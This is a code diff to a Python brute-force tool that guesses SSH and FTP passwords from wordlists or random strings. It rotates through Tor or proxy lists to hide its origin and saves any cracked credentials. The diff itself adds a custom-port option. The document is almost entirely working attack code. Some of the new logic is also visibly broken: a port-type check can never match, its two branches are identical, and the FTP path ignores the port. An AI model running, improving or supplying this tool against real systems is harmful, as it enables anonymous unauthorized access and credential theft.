@@ -78,8 +78,9 @@ def load_usernames_from_file(filename):
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
-    parser.add_argument('--service', required=True, choices=['ftp', 'ssh'],
-                        help="Service to attack. Choose 'ftp' or 'ssh'.")
+    parser.add_argument('--service', nargs='+', required=True,
+                        help="Service to attack. Choose 'ftp' or provide an integer value for the port.")
+
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument('-w', '--wordlist', help="Password Wordlist.")
     group.add_argument('-r', '--rand', action='store_true', help="Use a random password between 8 and 16 characters.")
@@ -87,14 +88,20 @@ def parse_arguments():
     parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
     parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
     parser.add_argument('--proxies', type=str, help="File containing a list of proxies.")
-    parser.add_argument('-p', '--port', type=int, help="Service port. Default if not specified")
     args = parser.parse_args()
 
+    if len(args.service) > 1:
+        args.service = tuple(args.service)
     if args.wordlist and args.rand:
         parser.error("You can't use both -w and -r at the same time. Choose one.")
     elif not args.wordlist and not args.rand:
         parser.error("You must provide one of -w or -r.")
-
+    if isinstance(args.service, list) and len(args.service) > 1:
+        # If it's a list with more than one element, it means both service and port were provided.
+        args.service = tuple(args.service)
+    elif len(args.service) == 1:
+        # If it's a list with a single element, it means only service was provided.
+        args.service = args.service[0]
     return args
 
 
@@ -134,15 +141,14 @@ def cycle_through_proxies(proxies):
         i = (i + 1) % len(proxies)
 
 
-def ssh_attack(ip, user, password, port=None, proxy_ip=None, proxy_port=None):
-    port = port or 22
+def ssh_attack(ip, port, user, password, proxy_ip=None, proxy_port=None):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     if proxy_ip and proxy_port:
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
     try:
-        client.connect(ip, username=user, password=password, port=port, timeout=5)
+        client.connect(ip, port=int(port), username=user, password=password, timeout=5)
         print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
         return True
     except paramiko.AuthenticationException:
@@ -171,8 +177,7 @@ def ssh_attack(ip, user, password, port=None, proxy_ip=None, proxy_port=None):
         client.close()
 
 
-def ftp_attack(ip, user, password, port=None, proxy_ip=None, proxy_port=None):
-    port = port or 22
+def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
     if proxy_ip and proxy_port:
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
@@ -229,17 +234,27 @@ if __name__ == '__main__':
 
         time.sleep(0.5)
         args = parse_arguments()
-
+        service = args.service[0]
+        port = args.service[1] if len(args.service) > 1 else None
         if args.rand:
             args.wordlist = generate_random_password_list()
 
+
         if args.tor and args.proxies:
-            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
+            print(
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
             exit(1)
 
         if args.tor:
             handle_timeout(set_up_tor)
-
+        if isinstance(port, int):
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
+            print(
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
+        else:
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
+            print(
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
         proxies = []
         if args.proxies:
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
@@ -259,7 +274,8 @@ if __name__ == '__main__':
                 proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)
 
                 if proxy_ip:
-                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
+                    print(
+                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
 
                 if idx == 0:
                     if not first_iteration:
@@ -267,42 +283,53 @@ if __name__ == '__main__':
                 else:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
 
-                if args.service == 'ssh' and not ssh_auth_type_checked:
-                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking SSH authentication type.")
-                        time.sleep(0.6)
-                        auth_type = test_ssh_auth_type(args.ip)
-                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
-                        if auth_type == "RSA key authentication":
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting.")
-                            exit(0)
-                        else:
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Continuing..")
-                        ssh_auth_type_checked = True
+                if 'ssh' in service and not ssh_auth_type_checked:
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking SSH authentication type.")
+                    time.sleep(0.6)
+                    auth_type = test_ssh_auth_type(args.ip)
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
+                    if auth_type == "RSA key authentication":
+                        print(
+                            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting.")
+                        exit(0)
+                    else:
+                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Continuing..")
+                    ssh_auth_type_checked = True
 
                 for j in range(password_chunk_size):
                     if i + j >= len(passwords):
                         break
                     password = passwords[i + j]
-                    print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
+                    print(current_timestamp(),
+                          f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
                     attempt_count += 1
                     time_elapsed = time.time() - start_time
-                    if args.service == 'ssh':
+                    if 'ssh' in service:
                         if not ssh_auth_type_checked:
                             auth_type = test_ssh_auth_type(args.ip)
                             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Detected {auth_type}.")
                             if auth_type == "RSA key authentication":
-                                print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting")
+                                print(current_timestamp(),
+                                      f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} RSA Key authentication, Bruteforce will not work. Exiting")
                                 exit(0)
                             ssh_auth_type_checked = True
-                        if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
-                            save_to_file(args.ip, args.service, user, password)
+                        if port is not None:
+                            port = int(port)
+                        else:
+                            port = 22
+
+                        if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
+                            # Updated this line
+                            print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                             users.remove(user)
                             break
-                    elif args.service == 'ftp':
+                    elif 'ftp' in service:
                         if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
-                            save_to_file(args.ip, args.service, user, password)
+                            print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                            save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                             users.remove(user)
                             break
 
